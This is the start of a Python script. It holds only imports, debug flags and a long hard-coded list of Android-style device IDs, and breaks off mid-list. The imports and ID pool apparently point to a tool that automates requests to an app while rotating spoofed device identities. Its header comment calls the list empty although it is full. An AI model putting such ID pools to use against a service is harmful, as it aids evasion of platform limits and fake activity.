import requests
import uuid
import time
import hashlib
import urllib3
import zlib
import zstandard as zstd
import socket
import logging
import datetime
import random
import struct
import threading
import sys
import os
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from functools import wraps
from enum import Enum
from typing import Dict, List, Any, Union, Tuple
from Crypto.Cipher import AES
from curl_cffi import requests as curl_requests

init()

# ── GLOBAL MODE FLAGS ────────────────────────────────────────────────
DEBUG_MODE   = False
VERBOSE_MODE = False

# ── DEFAULT DEVICE IDs (EMPTY - USER WILL PROVIDE) ─────────────────
DEVICE_IDS = [
    'and_cd9e459ea708a948d5c2f5a6ca8838cf648efdbc9a8c3ce703fa556d-34a4-4cde-a061-34938d08a26e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb0128abe9641e3b40eb5c04c-8454-4afa-9cce-6214563d4100',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffe70db6eb86cdceea5a6fff7-4ae8-4b70-94ba-9d1a3b0e19fa',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4504f1fc6e0437de4e9e5d3a-714d-4c20-9779-f5041dac458d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0ab2a698aa9e3fc1acec02f5-e7b1-47a8-b2b3-70a8142bf069',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc5ce4cdbae1ec0ae9b71057b-8a99-4598-b14d-0a34328370f2',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd678b623a6fecea12d8002d1-1852-410f-95f2-508f77082797',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffaab9da29ab8b9bad1d847a8-a58b-4946-ad36-90c5efcc846d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaa81f43ff4c81ebbf6494ba6-9af1-4ce3-8084-ef02f7947339',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcf4bb62efc76f42ae9c7403f-8f51-44d9-9ef6-73bc16783d47',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf1acbc0b1c386d5ab5a586f56-a5c9-4a3f-81b0-6aede6f13f51',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb69ccb7995936faf64aa7753-5784-488c-ad35-2ff07c45d113',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfed2b8ddfcb9f264beff5e560-a618-46e0-8454-0a86107b0a44',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4cd9ab838cabfddb54094c88-ca8b-49ff-be2b-7a60b4938c4a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdcf62e2f77f0a79c82ef81e1-e83a-4123-a9f1-aa5511732e30',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfab1cda31a52ef34a498095ab-0d32-4957-b367-83da104988e8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdefba8f6cfaa7ca122c9ac1d-44b7-4437-b043-a16ad61319c8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc9f5bb6cd4f41b4888c7d3f0-78ae-4f2e-bf38-e88222494a61',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfddc87dd5d04788a521045ab0-b515-417b-bfed-49031b61cce7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0c3dacabbda1aa88bdaad4a7-074d-445b-a11c-4558799ecb49',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5b36f17ed2ffef8bb7840255-ee08-4c5b-ab84-f24b41659c7b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff1dd5c3c648dff0e1d90a1f2-06f1-4452-aee0-4bf1ea3cc7f1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd17dbb7b579bed9200fc7247-bc28-40d1-b1d9-b7c1bc6cbaf7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaaefe10c94821f622115e2b9-2747-463c-8ba0-3056b91c02e1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbadadd2f9f8fbbd1ac9820ad-0a63-4f58-8949-0fd627d90843',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbd708dff09aa6eb22532efcd-7da7-4973-a4d9-573e08e30215',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf8aedcceeca4c594b0eca8f8a-fd5b-453b-a547-196d4dfb760c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc38bbba7b6596c6c913fdf3c-ac67-4639-a0b2-7db2ee0ce78c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9e1c75cdc5ef716c0770c2dd-6a39-4ff4-a3dd-c509f0c83ec4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf1cfda4e12761ad293e3290af-edf1-4b51-9425-5a729befc45b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5c27dacbea2778e39470fcfe-7162-470d-ae07-f55a5966126e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd0dfa641d3fee74a0efa3a15-3fa2-4379-9a07-38f06f2e9665',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfda05b8e143d74dea9c36979d-1ec1-49aa-b27e-6533294698fe',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbf3f4aaa3b6e93e1f2900963-a8f3-42f6-b879-3ed2c6ec6791',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffb6b76dcdbfdc3aeace66777-27dd-4a14-9528-e79074e141d1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb1ede1eedd714e0bdc7253c7-8f8f-4965-a54a-a288556495b1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc426eadb1dfe5e0efd28bc96-5495-4230-9af7-e48279a1acd0',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbcf5d57d9b5f5eb83e0758a9-e5fe-4f8e-a78c-00f0cc570e10',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9f4f3b8ae33aff7f9bc369b5-21e4-4c49-953a-3fad484afd3b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfafdfbb4f2beddbe2b6a19052-29a7-40c2-b283-6cab470f9464',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5c573cfe290ed5e0102c5809-229f-4c65-8ef9-fc3141b8e366',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc8c7ad8bd440cd943c41ea5d-d764-4810-a100-9e81ef987fe1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa187aefddf4d8afab77f4fbc-c0a5-4997-a564-a135927ea32d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4a277ae6830efda232a3f4cd-aea3-439d-a011-a9ff787e2a9c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffac0ab6891fedafbc2c9afa9-b894-4f94-b6ba-eda5f48586eb',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4653817dea00002f7a761558-acf5-4530-a655-d51afa6727e1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfeb1f0e58be93f3eafa27ab64-aa61-4deb-a4d2-342e6e286950',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf8de3cc5cba42b12f2dca3321-0334-484e-a5a5-92736044113b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0cba8c801fc14a4d67937b8e-98b9-4ce3-b5f8-bb3f73f710e8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0e38cd004f712ed03ec74839-4072-4b54-aac8-bfc92510017d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffeb3383abb7cef8bda989e33-a6f6-465f-8c26-f3cacbd17149',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb3af10ed950cb0abc2869355-7050-4bba-8402-3007a261bada',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5f8b1f0ca5a99d6f15550efe-956a-49c6-9e8b-3f28ce650094',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfddb1ebeea9ceefd4b0171fc3-0c12-4bf7-b3aa-11f7e6334e3b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4fbfb171dee5ca1859d8383c-ceba-4723-aefb-c4b8a62ecc1e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7b19efbdcbceb29a698c304c-c1a1-47ed-8788-a781c77d3b54',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb86fbda5c85de5332b82dad3-df7e-4e0a-a764-b3e3b44ba0e6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaffb6cf17ee79eaf7efd67d4-f721-419e-96b8-0d2fa68408ea',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd35a97b03aa4ffa4616fba0b-9fcc-4d3c-bc3d-81d397a1c8b1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb01aae6c37bf2fdfb43a36c5-f941-4b9e-bf8c-b44dcae9f66e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd1df4dd3b4c6ab60057b62c4-f123-470f-8132-4955194b3fae',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe908df1ae3f4eff95e42b428-04fc-493f-b12d-f96cb27b7d55',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfefbd8c094aecfb4cabbd6686-d451-4605-87ea-98573385e16b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7def47fad47f13cf2ed56d28-24d4-45e3-bfa1-a47903f4caf7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc0ffbddc280f87bb8589b1de-003b-46bd-960a-6b5e69755b90',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3e699a22f8b8aec6c7a438c5-9643-4c9e-b2c4-18da96ca260d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3c3f949021cbdf290511eb73-f243-4240-b373-492f7a9f100c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfda4dba0cbc3bcc4a1c1da7fd-bbae-4671-a604-84e63448dfd6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcdfaba2d352962ce008220ef-bf3e-43ed-b55d-99b46bfaced4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd1bfcbeb11e22f0facb81f30-3311-402d-a23f-ea90ce38b811',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf87dbcec61bbabfdebd5d5234-b9e4-4d05-86c3-b5e666c6fc75',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe88d3b2acb4d3cd34bfa37a1-64ba-46af-9081-54d86ec94a71',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdfa68dc0dfa77933e9ca256e-325c-400e-8a66-39a00e7bc75a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa2d7fb9ad729bb2d34730a09-d748-4a4c-bc4c-9fbdd90d00bf',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa4edff167a3dfec075384e1a-6600-4f3f-8427-bce4a11783f0',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb5bfaa0620643a8ec2939a57-a1f3-42c4-80d4-0f028fd360be',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4f5cbe1cb0e6dfcb270ba3e8-d0ed-4406-b548-22e218dd97c9',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb8b7a15d39503ecd66db7104-3266-4b87-82fb-34f5e338aad4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfde5a91fb9d3edf1b0a5bf0f7-dedc-4b13-a924-6a64e5db82c5',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0192f3ddebc2acfb509675ff-8a9c-42c4-9ddb-995d39b651a2',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5dad53abcc34e195af90791d-c772-4961-b0ff-bee225473c47',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdc7f23a9efcfefb48fd34433-d5bf-4896-b7cb-4a2976b6aa42',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbbc067ed0dffbdca06684454-4a1d-419f-a50e-0212969477bd',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcaf3d8dbd280fc86263e8ae7-4419-4f60-9301-e1946666f3d0',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4ebdabd88ebdaa0a650e25df-22c1-458a-863e-a9301fcb3e50',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9ec5a6ea5eef22ebfde016c5-4eef-416d-9894-454900f6d8ad',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc2f65354a35deacc5c678e9c-91d0-4983-a0ed-8d5c8ae03bd2',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0fdd0cfe33f5846ca402023a-3184-4894-b983-eebbd0ec046a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf544f4ebf4438c9edb9a53642-f0eb-4e1d-a416-e8112653caf5',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffa7ebbbdabf54bafce665cf2-3213-447b-b5e5-5e902a1d782a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf76d5ddb2def4363b5e6f7da8-36bf-4946-adcd-b0b126f68870',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf57dabdeeba1e0e2d3807df6d-9303-4763-8890-f2ab8c1acb9c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3ebe7fbcd0faeb7af47b8a10-5e45-4142-bafc-f63df72c91fa',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9a2b5db0dfff28b56fbccec0-211e-4448-87a1-2f05977b31fd',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5e2fa0a2ccd79a1ee667a0f4-fe4f-4b66-be72-3fc1421eecb3',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfac8cefcfdfec9ae0cf6822d4-d37c-4954-b82e-c2f0ad27a1c7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff3a83cf55d4335d12afc84e8-0225-49b5-9b20-4c5f0cb7ad94',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf80de20dd6556b429ebcba7db-c764-40dd-adf3-4072c47af0c4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbf80b88eedba82ed1d05c633-5679-436d-b6bd-07025fa0d9b6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf8fdd3592405eb2bbc3321afc-8e4f-4bc5-a1c2-4a7854f731fe',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd4c2df32a79c5ad0b43f5ddb-d633-4a5c-9db4-a71e7b200ff6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffcfccde070c34a6eaa940d9e-2872-442d-83be-cc33b8334918',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa3b20eede3ca7db3bb24de46-f57a-49a0-a244-5f7c468ea478',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbd97728ca5a5d8e4797d2620-4be8-4a59-ac66-18adb9e82f48',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb04d34d690ba91f7f8806b35-d516-4f9e-8e3f-f051d9f32415',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7905eb8a3efb5e4f11953ab2-4c94-4e00-94ee-b0ef5970baf8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff70ecaf7d237fac7605e8ced-9a21-4a7e-80e1-a408e818d82a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfffacecb93ead0a604cda7022-6a22-40f0-8b3c-a3cda45c9ced',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaefcb8adfdc0a03f300ba579-b5c0-45dd-8d17-37b1bad5592c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa043b7d8c99e9e5887aa1d01-efc2-4026-b90f-b163987dcde5',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb1e1fbf6bff4cd5c15eb3fb9-8a44-4f87-8ae3-88b34d8334f4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf1ebe93ce3b1b3d9b6c216bb8-4a9d-446c-a861-0b57825a325b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa2f6dddb4e839ef95f301092-fb1d-40ac-b13e-2e16a2beb8db',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbc83090cdb5a862bb4c7bd76-fc02-4e96-8c96-2db0a5154026',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf53b422bbbd1253b9e9267865-1827-4916-a189-be3627ddf830',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc2ac7c749cd3d9380a7bf672-5266-4a93-a828-a841cc58dc3d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfba9b4418ec81e8d6f4daff0d-3443-46f5-b0b6-402df1a5d9cf',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff1aace09aefb1ddd6babdb9a-bc21-474a-a7f9-6db925e59fc3',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfba4cf3c17b035671311b8a35-508f-4118-a8dc-0af3ce9cad22',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfceaa514eda362cf841b0b8a4-085f-4419-bb49-9a56b2ac62a6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb5a223d0aafdc4bb234919ba-c01f-4986-b98b-f7cebb5c46f3',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcc9c762f4dfbdbcde5ec09d4-41ee-44b6-98ec-e94cb3968055',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff80ebd0fa4e0512a87b394c8-4eee-491f-ad43-9e2c7ffb9cb3',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfeedf3fabfaa4ff62268104f7-ab55-4e01-821b-87284e056859',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf2eefaecbcfdf27f9b55efdef-72a4-463f-8efb-3817e6a1d659',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf8404e7d5fcafcce462182879-e130-48b0-9377-0f32d667dd13',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf35a5bb938cd96bbf586e8406-73d2-42fb-85ca-cd807a46f7e0',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa87dced20de1c58dd73d94f8-5e2a-40a9-a0f2-967fb900ded5',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf2c1b2daefb6bd5df18405a0d-fc60-4a23-b70a-30e5461a6e81',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf602ff64b949735e4e0269e0e-146b-4457-8509-86725914e4a1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbfe375a28ee90646b673752e-bb81-4c5e-a0ba-e592b06f670e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7d0aa14d0511dc4ac68c0ac0-e7c5-4ff1-bb15-39012a257c15',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4cd54cec5d1cc0f170fb8997-fd9a-45db-a9e5-5bb73c95d78d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe2f5c24b871bf3ff0a63f902-b728-42b9-8fd6-4038cdb6dfad',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb1acfabe7efaec005228e4f4-471b-4db0-ba45-2a6858766be1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe13421cfdfac9d996b2c5a3c-b27c-400a-bd5e-04379c22b50a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe96baaea7dbc5a6efdf1c612-f6ff-45c8-adc7-4926cc091d46',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7ceadc1facabaed6187b1d55-0f99-4178-bd16-e53c82ce935f',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbe6eeebd0c44e2bf106c27cf-22e6-45ee-b829-82965cbe05df',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbf254406d7ae32f67fb9bce9-0a95-4d29-9201-640784a5936a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa0f2be6faeecd25b765b76db-b5c2-43a9-8533-e974e0bf91af',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd4b8a1be0184b64808420e40-7f63-4806-90d5-db48e972b743',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdaae7ed18accf15b04e4c079-4a7b-47dd-b717-1aed197d613a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa3a97f8c128d1df8d8e00bfd-0527-4ea6-a7e3-99e659867678',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff345af9bd060fbcc79e410f1-3c46-4c7f-8f24-d44902451afc',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3de9f78f363db84053e564de-e1b7-42b5-804f-3751e0fd8a93',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb8fdeee3c440cafcb2b934f3-9495-461e-8efa-42d3341f9bdf',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf761b76b68e91fd1d5e9f8141-307d-4268-b282-ac5c2b62ec24',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9b1b5dbfa6bcdad43c172831-30c6-4224-9e46-e2e94bdc9659',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcc30c55d6af1dbb0e60d249d-0cdd-4beb-b0bc-e55f46cbb234',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5bb6728d3cc1c5df876472bb-bcc3-4478-a876-62f2ddb25dbc',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe652290bec6ebacc90163027-72a0-46d2-8ac2-8af6a01a4d46',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3ffe1c6edca85a3a302add9d-c8d3-462c-a9b7-edb570e22904',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff1d9b9dff90ee7e26b26b188-9e38-4b4a-97d2-73bdaa257745',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfeac4b5fefe26bfca5500aad2-cdd6-448d-8c29-649f75483430',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa9f0b6b8ce85810c30c973fb-2f43-435d-9931-f9ecd0a9bdbd',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9cf5d59a2fcee7ef60ff0e15-72f1-48fa-91e2-b228ababad05',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf41ca1bfaa27debe8724d4810-7012-43d7-acaa-fb6bb2919900',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf2b5af0461c3dafba9c0bcaa6-bcbd-44ba-8fae-5c5cfd774a1d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd4eead1e202b9403eadc91f2-2317-4a0f-b1cd-ca32bfc3c656',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5d1ecb3a2852dd9f839ca5b9-1c79-4e56-ac65-267ed190255c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf891f9ee4afaa2bb538157d1b-cfb6-447b-8b80-a711060ff7c4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfadb7dfb370ecdb83b5569c8e-bbc6-4806-954c-31e5733a4966',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdaedd1c6bddaefb3961ede01-7838-4157-b05b-5af11874dd61',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf519a6bfaa6ee8bcd69032a66-677b-4751-924f-594e8c13699c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfddfeaabbcf8abeea891aa63d-05f9-4c12-89d2-181a147e7113',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcdf53bd58cffeb9392e772ba-7601-47f0-97c3-ea6a67c12107',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf03f5ef7afd069f43a4cf3406-30d0-4596-bb45-4bcc934b66c2',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf67551cac51bf7b6bc56fc5af-affb-4428-be22-f6d888add5c8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd7ddf4a3bfcf91c3b8553134-1838-4649-b6d5-e042fdd0094c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd0faaebdae3b715eda86cee8-8f4f-4e1f-9a94-f6e6d52093f7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf764ff1bca1352f2394525708-5f57-4208-b2a0-77f3009de911',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb6dba30feca06851e48656c0-0a39-4466-9098-7fb9c03471bb',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc34f1109e5dc2cdc219156c6-f695-455d-88c0-89cdbda5e3b8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdc1eaee348e5d36b60d6f9e4-76b3-404b-9a65-4de82fee3388',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa4adc46dbbb22dcbbd412613-2586-4e42-bdf1-24c1ed45d390',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfeb7be594efbdaba8bc26bc11-ba54-4ac9-9405-8be65cd9cfd6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffa20bedb8b2fe7b090bea641-2814-4a3d-a40d-3e95509a7caf',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3900e56badff3d5c1f19bc5b-2c8a-46d6-841b-e296acca5a9b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffd80a73291b01ad30ad08aac-b2b6-41b4-9de6-4eb1c63f3b83',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf6e03be6442a1d063507ccf8a-a431-4f23-8029-4f5d4c78bdb8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfccdd7cf836a8faeec554be6e-d5c9-4c4c-b2fd-c52b1c851cdf',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5e95e4077bb132cd8b0a53a1-054b-4f44-b3d6-763ce64ba8fb',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf283d3aff7fb3578f848ef4bb-4b74-4990-b678-d6e5df4efbae',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffcd60c63adcc3cbde5ba11cd-c38e-4888-822d-7a5380edd1f9',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5838448eb04975cfc3e602f3-33d4-49d0-9d8f-f35bf4d608a3',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdafc482d7cdd50cee1f7e2fa-73a2-44c2-ae42-0e1d1ada315d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3bdce99fe0bad890134ce6a9-ab69-4ae5-be62-6655b1226cf1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf2aeb0cdb0a9d2ef2401b290c-b714-43cb-9474-3c6c4f66da6e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbee8d9815eeabfad6b869398-a59f-47d7-bd95-95d2c8d336c8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaf31ec8a71a4a3abe3349c87-b474-4626-bb93-7de003d993bb',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf09a23ea644ee78b8a14513e4-c943-4355-b0cb-607234e08cd0',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd8ee5fd4bcefe26801d0c1bc-be50-42ff-9617-e2730f936fb5',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb21cf696fef0d1db40bb3ef9-4727-452f-9162-4a9488d027f4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd44f82ba78f8f2154380077b-f207-46b2-b981-a2447e546266',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfba78b287e5dba6e70a72d32e-583c-4e7f-bd97-c1403546e99b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfeeffbbdb365cb4cc7c7323ec-ffb7-413c-8ae6-7a84b2e90e8e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfec50b460bd9ccdbc2c879743-fa73-4679-97e8-64f5aae1232e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5aaad624f93cc4d57859787f-d865-4ea0-bad3-d6e3783216db',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf6c62a43bfa1ab7ef35becb7a-227a-4d32-ae43-c749fa4022b1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3ca49b4bac6aae5c2461e4f9-880d-440a-a2c2-053c64a15495',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf989df14c608f3dc47aa151e2-091e-48cc-9fe6-dd5a4ac43f32',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfda485fc72fa0a244f9fef99e-67c3-4c8a-a6e2-6304bdc407fc',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7665a4e216f0cda6c5af01f5-e8ba-4d7a-8a98-89ad371403fa',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3a4fde1b581baa7a35fabfa8-2267-45d1-8d8d-91ef7fadb7ef',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbfa5ac2ce43ab58592211336-a030-484b-a483-caf3241d35ce',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbd0075b8b39b84ec89cd1ef2-97e5-4ec4-a323-25500b15d312',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7cac1d48128f0ffcc2453a1f-6893-4163-8fad-7eb562fbabf2',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5f6cba780cefd65da6d52595-3b0c-4eea-b461-c579db1ee2fb',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd35b7be8c071ac2f7ac39685-d52c-461c-b4aa-a303af572a9b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd11e5fbafc7ba12434fce109-4906-443e-bfb5-f4b4b6c73592',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf2cc97d743fce8bc990fb0e7b-c55f-40df-98a1-a7718a1b7c5c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9f4e02a8db04bf3e203dbcb9-28a1-4162-b960-c7249dadbf03',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4f22ba0cf764e7874ee68043-a021-45ae-b40a-78873b757193',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfade3aaa8ccfd3ba22552d325-d84a-4f71-b256-143d2719ff92',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf6d6ac1e114cecb52463642f8-a0bd-4f46-b943-a8767f23dab4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0a716e230efb6cec962e8a50-fa45-4dbf-ae40-055781e9de49',
